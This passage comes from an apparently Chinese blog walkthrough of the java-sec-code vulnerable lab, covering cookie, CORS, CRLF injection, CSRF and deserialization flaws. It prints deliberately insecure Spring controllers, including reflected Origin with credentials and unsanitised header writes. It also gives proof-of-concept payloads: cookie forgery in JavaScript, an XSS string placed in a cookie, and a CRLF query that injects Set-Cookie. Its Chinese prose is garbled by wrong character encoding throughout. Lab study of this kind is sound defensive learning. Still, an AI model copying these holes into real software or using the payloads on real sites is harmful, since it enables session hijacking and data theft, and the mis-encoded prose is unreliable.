class="hljs-meta">@CookieValue(&quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln06&quot;)</span><br>    <span class="hljs-comment">//å’Œ vuln05 ä»…è¯­æ³•ä¸åŒï¼ŒåŠŸèƒ½å®Œå…¨ä¸€æ ·ã€‚</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln06</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>vuln01</p><p><a href="http://127.0.0.1:8081/cookie/vuln01">http://127.0.0.1:8081/cookie/vuln01</a></p><p>æŠ“åŒ…æ”¹ cookieï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">nick</span>=admin;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930981.png" alt="20250723141110105"></p><p>vuln02</p><p>åŒ vuln01</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931435.png" alt="20250723141320799"></p><p>vuln03</p><p>å› ä¸ºå¤§å°å†™æ•æ„Ÿï¼Œæ‰€ä»¥è¦å†™å‡†ç¡®çš„ nick</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931594.png" alt="20250723141512271"></p><p>å¦‚æœä¸æ˜¯å…¨å°å†™ï¼Œå°±ä¼šè¢«æ‹¦æˆª</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931715.png" alt="20250723141532175"></p><p>vuln04</p><p>ä¸åŒºåˆ†å¤§å°å†™ï¼Œ</p><p>vuln05</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ä¼ªé€ ä¸€ä¸ª nick=admin çš„ Cookie</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=admin; path=/&quot;</span>;<br><br><span class="hljs-comment">// å‘é€è¯·æ±‚ï¼Œè·å–æ¥å£è¿”å›</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln05&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png" alt="20250723142428662"></p><p>vuln06</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931560.png" alt="20250723142510453"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=&lt;script&gt;alert(1)&lt;/script&gt;; path=/&quot;</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln06&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png"></p><h2 id="Cors"><a href="#Cors" class="headerlink" title="Cors"></a>Cors</h2><blockquote><p>è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><h4 id="åŸç†ä¸å·¥ä½œæµç¨‹"><a href="#åŸç†ä¸å·¥ä½œæµç¨‹" class="headerlink" title="åŸç†ä¸å·¥ä½œæµç¨‹"></a>åŸç†ä¸å·¥ä½œæµç¨‹</h4><p>CORSï¼ˆCross-Origin Resource Sharingï¼‰è·¨æºèµ„æºå…±äº«ï¼Œæ˜¯HTML5çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå…¶æ€æƒ³æ˜¯ä½¿ç”¨è‡ªå®šä¹‰çš„HTTPå¤´éƒ¨è®©æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡Œæ²Ÿé€šï¼Œå®ƒå…è®¸æµè§ˆå™¨å‘è·¨åŸŸæœåŠ¡å™¨å‘å‡ºXMLHttpRequestè¯·æ±‚ï¼Œä»è€Œå…‹æœAJAXåªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ã€‚</p><p>CORSçš„åŸºæœ¬åŸç†æ˜¯ï¼Œç¬¬ä¸‰æ–¹ç½‘ç«™æœåŠ¡å™¨ç”Ÿæˆè®¿é—®æ§åˆ¶ç­–ç•¥ï¼ŒæŒ‡å¯¼ç”¨æˆ·æµè§ˆå™¨æ”¾å®½ SOP çš„é™åˆ¶ï¼Œå®ç°ä¸æŒ‡å®šçš„ç›®æ ‡ç½‘ç«™å…±äº«æ•°æ®ã€‚</p><p>ç›¸æ¯”ä¹‹ä¸‹ï¼ŒCORSè¾ƒJSONPæ›´ä¸ºå¤æ‚ï¼ŒJSONPåªèƒ½ç”¨äºè·å–èµ„æºï¼ˆå³åªè¯»ï¼Œç±»ä¼¼äºGETè¯·æ±‚ï¼‰ï¼Œè€ŒCORSæ”¯æŒæ‰€æœ‰ç±»å‹çš„HTTPè¯·æ±‚ï¼ŒåŠŸèƒ½å®Œå–„ã€‚</p><p>CORSå…·ä½“å·¥ä½œæµç¨‹å¯åˆ†ä¸ºä¸‰æ­¥ï¼Œ</p><ol><li>èµ„æºæœåŠ¡å™¨æ ¹æ®è¯·æ±‚ä¸­Originå¤´è¿”å›è®¿é—®æ§åˆ¶ç­–ç•¥(Access-Control-Allow-Originå“åº”å¤´)ï¼Œå¹¶åœ¨å…¶ä¸­å£°æ˜å…è®¸è¯»å–å“åº”å†…å®¹çš„æºï¼›</li><li>æµè§ˆå™¨æ£€æŸ¥èµ„æºæœåŠ¡å™¨åœ¨Access-Control-Allow-Originå¤´ä¸­å£°æ˜çš„æºï¼Œæ˜¯å¦ä¸è¯·æ±‚æ–¹çš„æºç›¸ç¬¦ï¼Œå¦‚æœç›¸ç¬¦åˆï¼Œåˆ™å…è®¸è¯·æ±‚æ–¹è„šæœ¬è¯»å–å“åº”å†…å®¹ï¼Œå¦åˆ™ä¸å…è®¸ï¼›</li></ol><h4 id="CORSä¸CSRFçš„åŒºåˆ«"><a href="#CORSä¸CSRFçš„åŒºåˆ«" class="headerlink" title="CORSä¸CSRFçš„åŒºåˆ«"></a>CORSä¸CSRFçš„åŒºåˆ«</h4><p>ä¸€èˆ¬æœ‰CORSæ¼æ´çš„åœ°æ–¹éƒ½æœ‰CSRFã€‚</p><p>CSRFä¸€èˆ¬ä½¿ç”¨formè¡¨å•æäº¤è¯·æ±‚ï¼Œè€Œæµè§ˆå™¨æ˜¯ä¸ä¼šå¯¹formè¡¨å•è¿›è¡ŒåŒæºæ‹¦æˆªçš„ï¼Œå› ä¸ºè¿™æ˜¯æ— å“åº”çš„è¯·æ±‚ï¼Œæµè§ˆå™¨è®¤ä¸ºæ— å“åº”è¯·æ±‚æ˜¯å®‰å…¨çš„ã€‚</p><p>æµè§ˆå™¨çš„åŒæºç­–ç•¥çš„æœ¬è´¨æ˜¯ï¼šä¸€ä¸ªåŸŸåçš„JSï¼Œåœ¨æœªç»å…è®¸çš„æƒ…å†µä¸‹æ˜¯ä¸å¾—è¯»å–å¦ä¸€ä¸ªåŸŸåçš„å†…å®¹ï¼Œä½†æµè§ˆå™¨å¹¶ä¸é˜»æ­¢å‘å¦ä¸€ä¸ªåŸŸåå‘é€è¯·æ±‚ã€‚</p><p>ç›¸åŒç‚¹ï¼šéƒ½éœ€è¦ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼›éƒ½éœ€è¦å€ŸåŠ©Ajaxçš„å¼‚æ­¥åŠ è½½è¿‡ç¨‹ï¼›ä¸€èˆ¬éƒ½éœ€è¦ç”¨æˆ·ç™»å½•ç›®æ ‡ç«™ç‚¹ã€‚</p><p>ä¸åŒç‚¹ï¼šä¸€èˆ¬CORSæ¼æ´ç”¨äºè¯»å–å—å®³è€…çš„æ•æ„Ÿä¿¡æ¯ï¼Œè·å–è¯·æ±‚å“åº”çš„å†…å®¹ï¼›è€ŒCSRFåˆ™æ˜¯è¯±ä½¿å—å®³è€…ç‚¹å‡»æäº¤è¡¨å•æ¥è¿›è¡ŒæŸäº›æ•æ„Ÿæ“ä½œï¼Œä¸ç”¨è·å–è¯·æ±‚å“åº”å†…å®¹ã€‚</p><p>ç”±äºä»£ç é™åˆ¶ä¸ä¸¥æ ¼ï¼Œä¼šå¯¼è‡´è·¨åŸŸè¯·æ±‚ä¼ªé€ å¯ä»¥ç»“åˆxssï¼Œcsrfè¿›è¡Œæ”»å‡»</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cors.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cors&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cors</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/origin&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls1</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;origin&quot;</span>);<br>        <span class="hljs-comment">//åç«¯æ— éªŒè¯ï¼Œç›´æ¥å°†å‰ç«¯ä¼ æ¥çš„ origin åå°„å›å»ï¼Œæ²¡æœ‰åˆ¤æ–­è¿™ä¸ª origin æ˜¯å¦åˆæ³•</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class="hljs-comment">// set origin from header</span><br>        <span class="hljs-comment">//å¯ä»¥åœ¨è·¨åŸŸè¯·æ±‚ä¸­æºå¸¦ Cookie / Session / Authorization è¿™äº›èº«ä»½å‡­è¯</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);  <span class="hljs-comment">// allow cookie</span><br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/setHeader&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls2</span><span class="hljs-params">(HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">// åç«¯è®¾ç½®Access-Control-Allow-Originä¸º*çš„æƒ…å†µä¸‹ï¼Œè·¨åŸŸçš„æ—¶å€™å‰ç«¯å¦‚æœè®¾ç½®withCredentialsä¸ºtrueä¼šå¼‚å¸¸</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>);<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); //ä»»æ„ç½‘ç«™éƒ½å¯ä»¥è®¿é—®æœ¬ç½‘ç«™</code></p><p><code>response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  //å…è®¸è¿™äº›ä»»æ„ç½‘ç«™å¸¦ä¸Šç”¨æˆ·çš„ Cookie æ¥è®¿é—®æœ¬ç½‘ç«™</code></p><p>è¿™ä¿©ä¸ªå¤´ä¸€èµ·ç”¨å°±å¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ ä»»æ„æ¶æ„ç½‘é¡µï¼Œä»ä»»æ„ç½‘ç«™å¸¦ä¸Š Cookie è®¿é—®æœ¬ç½‘ç«™ï¼Œè·å–åˆ°ç”¨æˆ·æ•°æ®ï¼Œé€ æˆæ•°æ®æ³„éœ²ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>æ”»å‡»è€…ä» <code>evil.com</code> å‘èµ·è·¨åŸŸè¯·æ±‚ï¼ˆä½¿ç”¨å‰ç«¯è„šæœ¬æºå¸¦ Cookie å‘å¦ä¸€ä¸ªå­åŸŸå‘è¯·æ±‚ï¼‰ï¼Œè¯±å¯¼å·²ç»åœ¨ <code>http://127.0.0.1:8081</code> ç½‘ç«™ä¸Šç™»å½•çš„ç”¨æˆ·è®¿é—®  <code>evil.com</code> ï¼Œè€Œç”±äºæœåŠ¡ç«¯è®¾ç½®äº†<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</code>ï¼Œæ‰€ä»¥å½“æ”»å‡»è€…è®¿é—® <code>http://127.0.0.1:8081/cors/vuln/origin</code> é¡µé¢ï¼ŒæœåŠ¡ç«¯æ— è¿‡æ»¤å°±ä¼šå“åº”ï¼Œä½¿å¾—æ”»å‡»è€…æ‹¿åˆ°æ•æ„Ÿä¿¡æ¯ã€‚</p><p>corså¤ç°: <a href="https://blog.csdn.net/wanmiqi/article/details/119573354">https://blog.csdn.net/wanmiqi/article/details/119573354</a></p><h2 id="CRLFInjection"><a href="#CRLFInjection" class="headerlink" title="CRLFInjection"></a>CRLFInjection</h2><blockquote><p>åˆè¯†HTTPå“åº”æ‹†åˆ†æ”»å‡»ï¼ˆCRLF Injectionï¼‰</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CRLF æŒ‡çš„æ˜¯<strong>å›è½¦ç¬¦</strong>ï¼ˆCRï¼ŒASCII 13ï¼Œ\rï¼Œ%0dï¼‰å’Œ<strong>æ¢è¡Œç¬¦</strong>ï¼ˆLFï¼ŒASCII 10ï¼Œ\nï¼Œ%0aï¼‰çš„ç®€ç§°ï¼ˆ\r\nï¼‰ã€‚åœ¨ã€Š<a href="http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247483836&idx=1&sn=1b1ccd6f196c87b7f3bf4b1c585d9d9e&chksm=fc981e36cbef972043707782aaa968ba94a960adba855a35afc5e896edeb2160d513ab1667cf&scene=21#wechat_redirect">HTTP | HTTPæŠ¥æ–‡</a>ã€‹ä¸€æ–‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°HTTPæŠ¥æ–‡çš„ç»“æ„ï¼šHTTPæŠ¥æ–‡ä»¥çŠ¶æ€è¡Œå¼€å§‹ï¼Œè·Ÿåœ¨åé¢çš„æ˜¯HTTPé¦–éƒ¨ï¼ˆHTTP Headerï¼‰ï¼Œé¦–éƒ¨ç”±å¤šä¸ªé¦–éƒ¨å­—æ®µæ„æˆï¼Œæ¯è¡Œä¸€ä¸ªé¦–éƒ¨å­—æ®µï¼ŒHTTPé¦–éƒ¨åæ˜¯ä¸€ä¸ªç©ºè¡Œï¼Œç„¶åæ˜¯æŠ¥æ–‡ä¸»ä½“ï¼ˆHTTP Bodyï¼‰ã€‚çŠ¶æ€è¡Œå’Œé¦–éƒ¨ä¸­çš„æ¯è¡Œä»¥CRLFç»“æŸï¼Œé¦–éƒ¨ä¸ä¸»ä½“ä¹‹é—´ç”±ä¸€ç©ºè¡Œåˆ†éš”ã€‚æˆ–è€…ç†è§£ä¸ºé¦–éƒ¨ä¸­æ¯ä¸ªé¦–éƒ¨å­—æ®µä»¥ä¸€ä¸ªCRLFåˆ†éš”ï¼Œé¦–éƒ¨å’Œä¸»ä½“ç”±ä¸¤ä¸ªCRLFåˆ†éš”ã€‚</p><p>åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Header éƒ¨åˆ†ä¸ HTTP Body éƒ¨åˆ†æ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTP å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›æ¶æ„çš„HTTP Headerï¼Œå¦‚ä¼šè¯Cookieï¼Œç”šè‡³å¯ä»¥æ³¨å…¥ä¸€äº›HTMLä»£ç ã€‚è¿™å°±æ˜¯CRLFæ³¨å…¥æ¼æ´çš„æ ¸å¿ƒåŸç†ã€‚</p><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¦‚æœWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œä¾¿ä¼šå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥CRLFæ³¨å…¥æ¼æ´åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ï¼Œç®€ç§°HRSã€‚</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CRLFInjection.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/crlf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CRLFInjection</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/safecode&quot;)</span><br>    <span class="hljs-comment">//è¡¨ç¤ºè¯¥æ–¹æ³•ç›´æ¥å°†è¿”å›ç»“æœå†™å…¥ HTTP å“åº”ä½“ä¸­</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-comment">//æ¥æ”¶ HttpServletRequest request: å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚å¯¹è±¡ï¼ŒHttpServletResponse response: ç”¨äºæ„é€ å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">crlf</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">//å°†ç”¨æˆ·ä¼ å…¥çš„ test1 ä½œä¸ºå€¼æ·»åŠ åˆ°å“åº”å¤´ä¸­</span><br>        response.addHeader(<span class="hljs-string">&quot;test1&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test1&quot;</span>));<br>        <span class="hljs-comment">//è®¾ç½® test2 å“åº”å¤´ä¸ºè¯·æ±‚å‚æ•° test2 çš„å€¼ã€‚å¦‚æœè¯¥ header å·²å­˜åœ¨ï¼Œå°†è¢«è¦†ç›–</span><br>        response.setHeader(<span class="hljs-string">&quot;test2&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test2&quot;</span>));<br>        <span class="hljs-comment">//è·å–å‚æ•° test3 çš„å€¼ï¼Œèµ‹ç»™ author</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;test3&quot;</span>);<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„ Cookieï¼Œåä¸º test3ï¼Œå€¼ä¸º author</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;test3&quot;</span>, author);<br>        <span class="hljs-comment">//å°†è¯¥ Cookie æ·»åŠ åˆ°å“åº”å¤´ä¸­</span><br>        response.addCookie(cookie);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>æ„é€ POCï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/crlf/safecode?test<span class="hljs-number">1</span><span class="hljs-operator">=</span>abc<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>ASet-Cookie:<span class="hljs-variable">%20</span>evil<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸æ¥è®²åº”è¯¥çœ‹åˆ°ä¸€ä¸ªæ–°çš„æ ‡å¤´</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Set-Cookie: <span class="hljs-attribute">evil</span>=1<br></code></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œæ²¡æœ‰å¤ç°æˆåŠŸï¼Œå¯èƒ½æ˜¯å› ä¸º tomcat ç‰ˆæœ¬é«˜è‡ªåŠ¨è¿‡æ»¤äº† <code>\r\n</code> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933198.png" alt="20250723161852286"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">CSRFæ¼æ´åŸç†æ”»å‡»ä¸é˜²å¾¡ï¼ˆéå¸¸ç»†ï¼‰-CSDNåšå®¢</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933314.jpeg" alt="20250724095137238"></p><p>æ‰€ä»¥è¦è¢«CSRFæ”»å‡»ï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li>ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚</li><li>åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/csrf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CSRF</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;form&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/post&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">post</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CSRF passed.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Deserialize"><a href="#Deserialize" class="headerlink" title="Deserialize"></a>Deserialize</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> org.joychou.config.Constants;<br><span class="hljs-keyword">import</span> org.joychou.security.AntObjectInputStream;<br><span class="hljs-keyword">import</span> org.slf4j.Logger;<br><span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> 